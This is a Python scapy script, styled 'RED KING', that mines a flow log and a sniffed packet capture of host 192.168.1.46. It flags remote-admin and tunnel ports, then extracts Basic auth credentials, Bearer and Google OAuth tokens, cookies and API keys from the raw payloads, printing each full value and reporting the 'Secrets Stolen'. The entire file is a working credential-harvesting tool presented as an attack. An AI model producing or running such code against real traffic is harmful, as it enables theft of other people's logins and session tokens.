from scapy.all import *
import csv
import re
import os

TARGET_PCAP = "pcap2/sniffed-46.pcap"
FLOWS_CSV = "pcap2/flows_192.168.1.46_all.csv"


def analyze_targeted_evidence():
    print("=" * 60)
    print("⚡ RED KING: TARGET 192.168.1.46 DEEP EXTRACTION")
    print("=" * 60)

    # 1. Analyze Flows CSV for Tunnel/C2 Patterns
    print("[*] Phase 1: Analyzing Flow Metadata...")
    tunnel_candidates = []

    try:
        with open(FLOWS_CSV, "r") as f:
            reader = csv.DictReader(f)
            for row in reader:
                # Check for Radmin, SMB, or suspicious ports typical of tunnels
                if row["service"] in ["radmin", "ssh", "ssl"] or row["id.resp_p"] in [
                    "443",
                    "8080",
                    "4899",
                ]:
                    tunnel_candidates.append(row)
    except Exception as e:
        print(f"[!] Error reading flows: {e}")

    print(f"[+] Found {len(tunnel_candidates)} suspicious flow records.")
    for cand in tunnel_candidates[:5]:
        print(
            f"    -> {cand['service']} connection to {cand['id.resp_h']}:{cand['id.resp_p']}"
        )

    # 2. Deep Packet Inspection of sniffed-46.pcap
    print("\n[*] Phase 2: Analyzing Packet Payloads (PCAP)...")

    if not os.path.exists(TARGET_PCAP):
        print(f"[!] Critical: {TARGET_PCAP} not found.")
        return

    packets = rdpcap(TARGET_PCAP)
    sensitive_data = []

    # Regex for common tokens
    patterns = {
        "Basic Auth": re.compile(rb"Authorization:\s*Basic\s+([a-zA-Z0-9+/=]+)"),
        "Bearer Token": re.compile(rb"Authorization:\s*Bearer\s+([a-zA-Z0-9-._~+/=]+)"),
        "Cookie": re.compile(rb"Cookie:\s*(.+)"),
        "Google/Cloud": re.compile(rb"(ya29\.[a-zA-Z0-9_-]+)"),  # Google OAuth
        "Generic Key": re.compile(rb"key=([a-zA-Z0-9_-]+)"),
    }

    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            for label, pattern in patterns.items():
                match = pattern.search(payload)
                if match:
                    extracted = match.group(1).decode(errors="ignore")
                    # Dedup
                    entry = f"{label}: {extracted[:50]}..."
                    if entry not in sensitive_data:
                        sensitive_data.append(entry)
                        print(f"[!!!] CRITICAL INTEL: {label} FOUND")
                        print(f"      Value: {extracted}")

    if not sensitive_data:
        print("[-] No cleartext credentials found in this specific PCAP.")
        print("    Traffic might be encrypted (TLS) or tokens are in another file.")
    else:
        print(f"\n[+] EXTRACTION COMPLETE: {len(sensitive_data)} Secrets Stolen.")


if __name__ == "__main__":
    analyze_targeted_evidence()
